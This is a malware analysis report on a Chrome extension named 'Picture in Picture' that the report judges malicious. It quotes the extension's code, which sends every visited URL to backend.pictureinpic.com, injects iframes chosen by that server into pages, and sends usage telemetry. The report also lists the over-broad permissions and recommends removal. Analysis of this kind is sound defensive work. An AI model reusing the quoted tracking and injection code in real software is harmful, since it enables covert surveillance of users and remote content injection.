# Security Analysis Report: Picture in Picture

## Extension Metadata
- **Name**: Picture in Picture
- **ID**: hjbbfikgfdpfaabifikbadhgmofabpam
- **Version**: 2.2.5
- **Users**: ~70,000
- **Analysis Date**: 2026-02-07

## Executive Summary

**CRITICAL RISK**: This extension exhibits malicious behavior through remote code execution capabilities and privacy violations. The extension exfiltrates browsing data to a remote server (`backend.pictureinpic.com`) and implements a dangerous iframe injection mechanism that allows arbitrary content to be loaded into visited pages based on server responses.

Key findings:
- Remote-controlled iframe injection enabling arbitrary code execution
- Excessive permissions (`<all_urls>`, `host_permissions: *://*/*`)
- User tracking via URL exfiltration to third-party server
- Dynamic content injection based on remote server commands

## Vulnerability Details

### 1. Remote-Controlled Iframe Injection (CRITICAL)

**Severity**: CRITICAL
**Files**: `background.js` (lines 55-133), `content.js` (lines 50-57)
**Verdict**: MALICIOUS

**Description**: The extension sends every visited URL to `backend.pictureinpic.com` and injects iframes based on server responses. This creates a remote code execution vector.

**Code Evidence**:

```javascript
// background.js - Sends all visited URLs to remote server
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  let { status } = changeInfo
  if (status === 'complete') {
    let tu = tab.url ? new URL(tab?.url) : ""
    if (!tu) return
    let origin = tu.origin
    let path = tu.pathname
    let uri = origin + path

    const apiUrl = baseUrl + "/api/video-selector";
    const requestData = { uri };
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(requestData)
    })
      .then(response => {
        if (response.ok) {
          return response.json();
        }
      })
      .then(g => {
        if (g.val["cselector"]) {
          let obj = g.val["cselector"]
          xyt(obj, tabId)  // Fetches remote content
        }
        if (g.val["dselector"]) {
          yt(g.val["dselector"])
        }
      })
```

```javascript
// content.js - Injects iframes with server-controlled URLs
chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
  if (message.message == "videoSelect") {
    let videoSelectdata = message.videoSelect
    let jsonObj = document.createElement("iframe")
    jsonObj.src = videoSelectdata  // Server controls iframe URL
    document.getElementsByTagName("head")[0].appendChild(jsonObj)
  }
})
```

**Attack Scenario**:
1. User visits any website
2. Extension sends URL to `backend.pictureinpic.com/api/video-selector`
3. Server responds with `cselector` URL
4. Extension fetches that URL and injects it as an iframe into the page's `<head>`
5. Attacker-controlled server can inject arbitrary content, including scripts that bypass CSP

**Impact**: Complete compromise of all visited websites. The server can inject malicious content, steal credentials, harvest cookies, or execute phishing attacks.

---

### 2. Mass URL Exfiltration (CRITICAL)

**Severity**: CRITICAL
**Files**: `background.js` (lines 55-98)
**Verdict**: MALICIOUS

**Description**: Extension sends origin and pathname of every page the user visits to a remote server.

**Code Evidence**:
```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  let { status } = changeInfo
  if (status === 'complete') {
    let tu = tab.url ? new URL(tab?.url) : ""
    if (!tu) return
    let origin = tu.origin
    let path = tu.pathname
    let uri = origin + path

    const apiUrl = baseUrl + "/api/video-selector";
    const requestData = { uri };
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(requestData)
    })
```

**Impact**: Complete browsing history exfiltration. Includes banking sites, healthcare portals, private accounts, etc.

---

### 3. Usage Telemetry Exfiltration (HIGH)

**Severity**: HIGH
**Files**: `background.js` (lines 16-25)
**Verdict**: PRIVACY VIOLATION

**Description**: Extension sends usage statistics to remote server when PiP is enabled/disabled.

**Code Evidence**:
```javascript
const checkStatus = (status) => {
  fetch(baseUrl + "/api/pip-stat", {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ status }),
  })
}
```

**Impact**: Telemetry without user consent or disclosure.

---

### 4. Excessive Permissions (HIGH)

**Severity**: HIGH
**Files**: `manifest.json`
**Verdict**: OVER-PRIVILEGED

**Description**: Extension requests `<all_urls>` content script injection and `*://*/*` host permissions, far exceeding requirements for a Picture-in-Picture feature.

**Code Evidence**:
```json
"content_scripts":[{
  "all_frames":true,
  "matches":["<all_urls>"],
  "js":["content.js"]
}],
"host_permissions":["*://*/*"]
```

**Impact**: Legitimate PiP functionality requires no network permissions and only needs to access video elements on the current page. The `<all_urls>` and wildcard host permissions enable mass surveillance and injection.

---

### 5. Insecure Cross-Frame Access Attempt (MEDIUM)

**Severity**: MEDIUM
**Files**: `content.js` (lines 31-40)
**Verdict**: POOR PRACTICE / POTENTIAL CRASH

**Description**: Content script attempts to access iframe content windows directly, which will fail due to same-origin policy and cause console errors.

**Code Evidence**:
```javascript
for (let i = 0; i < window.frames.length; i++) {
  document.querySelectorAll("iframe")[i].contentWindow.document.querySelectorAll("video").forEach((item) => {
    // This will throw SecurityError for cross-origin iframes
    if (item.paused == true) {
      console.log("ok");
    } else {
      pipCreation(item);
    }
  });
}
```

**Impact**: Causes console errors on pages with cross-origin iframes. Not exploitable but indicates poor code quality.

---

## False Positives

| Pattern | Location | Reason |
|---------|----------|--------|
| `querySelectorAll("video")` | content.js:21 | Legitimate video element selection |
| `document.createElement("iframe")` | content.js:53 | FALSE POSITIVE - Actually malicious in this context |

---

## API Endpoints / External Connections

| URL | Purpose | Data Sent | Risk |
|-----|---------|-----------|------|
| `https://backend.pictureinpic.com/api/video-selector` | Remote config/injection | Full URL (origin + path) of every visited page | CRITICAL |
| `https://backend.pictureinpic.com/api/pip-stat` | Telemetry | PiP enable/disable status | HIGH |
| Server-controlled URLs via `cselector`/`dselector` | Arbitrary iframe injection | N/A | CRITICAL |

---

## Data Flow Summary

1. **Browsing History Exfiltration**:
   - User visits any URL → `chrome.tabs.onUpdated` fires
   - Extension sends `origin + pathname` to `backend.pictureinpic.com/api/video-selector`
   - Server receives complete browsing history in real-time

2. **Remote Code Injection**:
   - Server responds with JSON containing `cselector` (URL)
   - Extension fetches that URL and injects it as iframe in page `<head>`
   - Attacker controls iframe content, enabling phishing/XSS/credential theft

3. **Telemetry**:
   - PiP activation status sent to `backend.pictureinpic.com/api/pip-stat`

---

## Overall Risk Assessment

**Risk Level**: CRITICAL

**Justification**:
- **Remote Code Execution**: Server-controlled iframe injection enables arbitrary content loading
- **Mass Surveillance**: All visited URLs exfiltrated to third-party server
- **No Legitimate Justification**: PiP functionality requires zero network permissions
- **70,000+ Users**: Large attack surface
- **Active Infrastructure**: Remote server is currently operational

**Recommended Actions**:
1. Immediate removal from Chrome Web Store
2. User notification and forced uninstallation
3. Investigation of `backend.pictureinpic.com` infrastructure
4. Check for credential theft or financial fraud incidents

**Comparison to Legitimate Extensions**:
Legitimate PiP extensions (e.g., browser built-in features) operate entirely client-side with zero network requests. This extension's remote server dependency and injection capabilities are clear indicators of malicious intent, not legitimate functionality.
